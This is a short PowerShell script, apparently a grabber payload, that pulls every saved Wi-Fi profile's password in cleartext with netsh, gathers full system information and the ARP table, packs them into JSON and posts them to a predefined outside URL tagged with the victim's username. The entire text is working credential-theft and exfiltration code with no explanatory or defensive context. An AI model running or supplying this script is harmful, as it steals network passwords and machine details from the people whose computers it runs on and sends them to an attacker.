# $local = ((Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}) | Out-String).replace("`r`n       ","").split("`r`n") | Select-String "(.+)\W+\:(.+)$"
$wifi = @{}
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{$wifi.add($name,$pass)}
$info = Get-ComputerInfo | ConvertTo-Json | ConvertFrom-Json 
$net = arp -a 
$data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "local" = $local; "net" = $net ; "info" = $info} | ConvertTo-Json
Invoke-RestMethod $url/$(whoami) -Method Post -Body $data #$url is predefined